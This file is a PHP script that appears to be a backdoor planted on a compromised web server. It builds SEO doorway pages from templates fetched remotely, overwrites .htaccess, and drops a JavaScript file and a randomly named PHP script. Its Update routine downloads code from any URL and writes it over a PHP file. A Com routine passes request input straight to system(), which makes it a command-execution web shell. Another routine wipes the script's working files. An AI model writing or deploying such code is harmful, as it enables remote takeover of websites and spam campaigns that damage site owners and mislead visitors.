<?php
ignore_user_abort(1);
set_time_limit(0);

function Clear()
{
	unlink("c");
	unlink("1r.txt");
	unlink("2r.txt");
  unlink("log");
  unlink("t.t");
}

 
function GetVar($name, &$var)
{
	$var = "";
	if (isset($_POST[$name]))
		$var = $_POST[$name];

  if (isset($_GET[$name]))
		$var = $_GET[$name];
	
	if (($var) =="")
	  return  false;
	  else return true;
}


function Gen2()
{
	$alp = "abcdefghiklmnjsweqrtyuiopzx";
	$maps = array();
	$md = false;
	if (isset($_POST["sg"]))
		$sg = $_POST["sg"];

     if (isset($_GET["sg"]))
		$sg = $_GET["sg"]; 
		
     if (isset($_GET["md"]))
       $md = true; 
	
	$path = "";
	$fr = fopen("1r.txt", "a+");
	$f2r = fopen("2r.txt", "a+");
    $domname = $_GET['dn'];
    $domname1 = $domname;
	$domname = "http://".$domname;
	if (file_exists("c"))
	{
		$fconf = file("c");
		$i_dor = trim($fconf[0]);
		$scrname = trim($fconf[1]);
        $pname = trim($fconf[2]);
		$i_dor = $i_dor+0;
		$pagetmp = file_get_contents("t.t");
	}
	else 
	{
		$f1t = fopen("1g", "w+");
		$f1tname = $sg."1g.php";
		$fp = fopen($f1tname, "r");
		$fin = '';
		while (!feof($fp))
		{
		   $fc = fgets($fp, 1024);
		   if (!$fc) break;
		     $fin .= $fc;
		}
		fclose($fp);
		fwrite($f1t, $fin);
		fclose($f1t); 
		
		if (!file_exists("t.t")) {

            
			$htname = $domname;
			$fp = fopen($htname, "r");
			$fin = '';
			while (!feof($fp))
			{
				 $fc = fgets($fp, 1024);
				 if (!$fc) break;
			   $fin .= $fc;
			}
			fclose($fp);
		  

			$pagetmp = $fin;
			if (!stristr($pagetmp, "</body>")) {
				$f1g = file("1g");
				$curd = trim($f1g[mt_rand(0,count($f1g)-1)]);
				$htname = "http://".$curd;
				echo "curd=$curd";
				$fp = fopen($htname, "r");
				$fin = '';
				while (!feof($fp))
				{
					 $fc = fgets($fp, 1024);
					 if (!$fc) break;
			  	 $fin .= $fc;
				}
				fclose($fp);
		        $pagetmp = $fin;
			}
			 
			{
                
                  $bodys = "</body>";

                if (strstr($pagetmp, "</Body>"))
                  $bodys = "</Body>";

                if (strstr($pagetmp, "</BODY>"))
                  $bodys = "</BODY>";

				$con = "<ALL_KEY1><LINKSM1><ALL_KEY2><LINKSM2><ALL_KEY3><LINKSM3><ALL_KEY4><LINKSM4>$bodys";
				$pa = explode($bodys, $pagetmp);
				$pagetmp = $pa[0].$con.$pa[1];
				
				$pagetmp = ereg_replace("<TITLE>", "<TITLE><KEY1> - ", $pagetmp);
				$pagetmp = ereg_replace("<Title>", "<Title><KEY1> - ", $pagetmp);
				$pagetmp = ereg_replace("<title>", "<title><KEY1> - ", $pagetmp);
				
				preg_match_all( '|src=(.*) |sUS', $pagetmp, $srcs );
				
				$srcs = $srcs[1];
				$srcs = array_unique($srcs);
				foreach ($srcs as &$cur)
				{
				 
					$curo = $cur;
					$cur = ereg_replace("\"", "", $cur);
					if (strstr($cur, "http") || $cur[0]=="/" )
					{
						continue;
					}
					else 
					{
						$cur = "\"../".$cur."\"";
						$pagetmp = ereg_replace($curo, $cur, $pagetmp);
						 
					}
				}
				
				preg_match_all( '|href=(.*) |sUS', $pagetmp, $srcs );
				
				$srcs = $srcs[1];
				$srcs = array_unique($srcs);
				
				foreach ($srcs as &$cur)
				{
					$curo = $cur;
					$cur = ereg_replace("\"", "", $cur);
					if (strstr($cur, "http") || $cur[0]=="/" || $cur[0]=="#")
					{
						continue;
					}
					else 
					{
						$cur = "\"../".$cur."\"";
						$pagetmp = str_replace($curo, $cur, $pagetmp);
						 
					}
				}
								
				
			}
			
			$ftmp = fopen("t.t", "w+");
			fwrite($ftmp, $pagetmp);
			fclose($ftmp);
		}
		else 
		{
			$pagetmp = file_get_contents("t.t");
		}
		$scrname = "";
		$scrnamec = mt_rand(4,6);
	    for ($i=0; $i<$scrnamec; $i++)
	 	{
			$ran = mt_rand(0,26);
			$sym = $alp[$ran];
			$scrname = $scrname.$sym;
		}
		$scrname .= ".php";
		
		//$pname = "q";
		$pnamec = mt_rand(1,2);
	    for ($i=0; $i<$pnamec; $i++)
	 	{
			$ran = mt_rand(0,26);
			$sym = $alp[$ran];
			$pname = $pname.$sym;
		}
		
		
		$fconf = fopen("c", "w+");
		$rnd = mt_rand(0, 999);
	 	$nm = "";
	    for ($i=0; $i<5; $i++)
	 	{
			$ran = mt_rand(0,26);
			$sym = $alp[$ran];
			$nm = $nm.$sym;
		}
		
        fwrite($fconf, "0\n");
		$pid = 0;
		$fht = fopen(".htaccess", "w+");
		$htname = $sg."2.txt";
		$fp = fopen($htname, "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);
		fwrite($fht, $fin);
		fclose($fht); 


$fht = fopen("2.js", "w+");
		$htname = $sg."2js.txt";
		$fp = fopen($htname, "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);
		fwrite($fht, $fin);
		fclose($fht); 

       
		$fht = fopen("$scrname", "w+");
		$htname = $sg."show.txt";
		$fp = fopen($htname, "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);
		fwrite($fht, $fin);
		fclose($fht); 
		
		
		$f1t = fopen("1t", "w+");
		$f1tname = $sg."1t.php";
		$fp = fopen($f1tname, "r");
		$fin = '';
		while (!feof($fp))
		{
		   $fc = fgets($fp, 1024);
		   if (!$fc) break;
		     $fin .= $fc;
		}
		fclose($fp);
		fwrite($f1t, $fin);
		fclose($f1t); 
		
		
		
		
	}
	$i_dor++;
	$i_dor--;
	$a1t = file("1t");
	$a1g = file("1g");
	$ar1 = array("<li>","<p>","<br>");
	$ar2 = array("</li>","</p>","<br>");
    $gname = $sg."sgen2.php";
	for ($j=$pid; $j<$pid+10; $j++)
	{
		$curpage = $pagetmp;
		$rndo = mt_rand(0,count($ar1)-1);
		$ob1 = $ar1[$rndo];		
		$ob2 = $ar2[$rndo];	
		$cth = trim($a1t[$i_dor]);
		$tmp1 = explode("||", $cth);
		$cth = $tmp1[1];
		$curname = $tmp1[0];
		$anc = $tmp1[1];
		$i_dor++;
		$fc = ""; 
		$fp = fopen($gname."?th=$cth", "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);

		
	    $allkeys = $fin;
	    $arr1 = explode("<KT>", $allkeys);
	    $allkeys = $arr1[0];
	    $title = $arr1[1];
	    $arrkeys = explode("<KD>", $allkeys);
	    
	    $curpage = ereg_replace("<KEY1>", $title, $curpage);
	    
	    for ($z=0; $z<4; $z++)
	    {
	    	$z1 = $z+1;
	    	$curpage = ereg_replace("<ALL_KEY$z1>", "<a href=http://$domname1>$domname1</a>".$arrkeys[$z], $curpage);
	    }
	    
		$links ="";
			
	 	if (($i_dor==927))
		{
			$rlink1 = mt_rand(1,4);
			
			while (true) {
				$rlink2 = mt_rand(1,4);
				if ($rlink2!=$rlink1) {
					break;
				}
			}
			

			$srnd = mt_rand(3,10);

			$links1 = "";
			for ($y=0; $y<$srnd; $y++)
			{
				$rndi = mt_rand(0,319);
				$rth = trim($a1t[$rndi]);
				$tmp1 = explode("||", $rth);
				$rth = $tmp1[0];
				$mname = $tmp1[1];
				$links1 .= "$ob1 <a href='$scrname?$pname=$rth'>$mname</a>$ob2 ";
				 
				 
				
			}
			$curpage = ereg_replace("<LINKSM$rlink1>", $links1, $curpage);
			
			$srnd = mt_rand(3,10);
			$links2 = "";
			for ($y=0; $y<$srnd; $y++)
			{
				$rndi = mt_rand(0,319);
				$rth = trim($a1t[$rndi]);
				$tmp1 = explode("||", $rth);
				$rth = $tmp1[0];
				$mname = $tmp1[1];
				$links2 .= "$ob1 <a href='$scrname?$pname=$rth'>$mname</a>$ob2 ";
				 
				
			}
			$curpage = ereg_replace("<LINKSM$rlink2>", $links2, $curpage);

		}
		
		 
		
			    $curpage = ereg_replace("<LINKSD1>", "", $curpage);
			$curpage = ereg_replace("<LINKSD2>", "", $curpage);
			$curpage = ereg_replace("<LINKSD3>", "", $curpage);
			$curpage = ereg_replace("<LINKSD4>", "", $curpage);
			
		  
  
	$curs = $cth;
	
	$fnd = fopen("$curname", "w+");
	fwrite($fnd, $curpage);
	fclose($fnd);
	if (($md) )
	{
		fwrite($fr, "$scrname?$pname=$curname"."||$anc\n");
	}
	if (($md) && ($i_dor==92) )
	{
		fwrite($f2r, "$scrname?$pname=$curname"."||$anc\n");
	}
}

	$fconf = fopen("c", "w+");
	fwrite($fconf, $i_dor."\n");
	fwrite($fconf, $scrname."\n");
	fwrite($fconf, $pname."\n");
	fclose($fconf);
}


function Update()
{
	if (isset($_GET["name"]))
		$sname = $_GET["name"];

	$thisname = "$sname.php";
	if (isset($_POST['u']))
	  $u = $_POST['u'];
	  
	if (isset($_GET['u']))
 		$u = $_GET['u'];
 		
 	$fp = fopen($u, "r");
  $fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
  fclose($fp);
  
  $fthis = fopen($thisname, "w+");
  fwrite($fthis, $fin);
  fclose($fthis);
}

function Com()
{
	if (isset($_POST['c']))
	  @system($_POST['c']);
  if (isset($_GET['c']))
		@system($_GET['c']);
}


 
function WrTest()
{
	$path = trim($_GET['wr']);
	$htname = $path."w.txt";
		$fp = fopen($htname, "r");
		$fin = '';
		while (!feof($fp))
		{
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
		}
		fclose($fp);
;
	$fout = fopen("w.txt", "w+");
	fwrite($fout, $fin);
	fclose($fout);
	
}


function MEdit()
{
	  if (isset($_GET["sg"]))
		$sg = $_GET["sg"]; 
		
	  $maps = file("1r.txt");
	  
	   
	  $htname = $sg."mgen2.php";
	  $fp = fopen($htname, "r");
	  $fin = '';
	  while (!feof($fp))
	  {
			 $fc = fgets($fp, 1024);
			 if (!$fc) break;
		   $fin .= $fc;
	  }
	  
	  $fin = explode("\n", $fin);
	  
	for ($i=0; $i<count($maps); $i++)
	{		
	  $ar = explode("||", $maps[$i]);
	  $mn = $ar[0];
	  $mn = explode("=", $mn);
	  $mn = $mn[1];
	  $src = file_get_contents($mn);
	  $fmap = fopen($mn, "w+");
	 
	  
	  $links = "";
	  for ($z=0; $z<80; $z++)
	  {
	  	 $rndl = mt_rand(0,count($fin)-1);
	  	 $links .= $fin[$rndl]."\n";
	  }
	  $src = ereg_replace("<LINKSM1>", $links, $src);
	  
	    $links = "";
	  for ($z=80; $z<160; $z++)
	  {
	  	 $rndl = mt_rand(0,count($fin)-1);
	  	 $links .= $fin[$rndl]."\n";
	  }
	  $src = ereg_replace("<LINKSM2>", $links, $src);
	  
	    $links = "";
	  for ($z=160; $z<240; $z++)
	  {
	  	 $rndl = mt_rand(0,count($fin)-1);
	  	 $links .= $fin[$rndl]."\n";
	  }
	  $src = ereg_replace("<LINKSM3>", $links, $src);
	  
	    $links = "";
	  for ($z=240; $z<320; $z++)
	  {
	  	 $rndl = mt_rand(0,count($fin)-1);
	  	 $links .= $fin[$rndl]."\n";
	  }
	  $src = ereg_replace("<LINKSM4>", $links, $src);
  
	  fwrite($fmap, $src);
	  fclose($fmap);
	}
}


function Main()
{
	if (isset($_POST['u']) || isset($_GET['u']))
	{
		Update();
		exit();
	}
	
 
	
	if (isset($_POST['g2']) || isset($_GET['g2']))
	{
		Gen2();
		exit();
	}
	
 
  if (isset($_POST['cl']) || isset($_GET['cl']))
	{
		Clear();
		exit();
	}
	
 
		if (isset($_POST['wr']) || isset($_GET['wr']))
	{
		WrTest();
		exit();
	}
	
	if (isset($_POST['me']) || isset($_GET['me']))
	{
		MEdit();
		exit();
	}
	
	
	echo "<ok>";
	
}

Main();

?>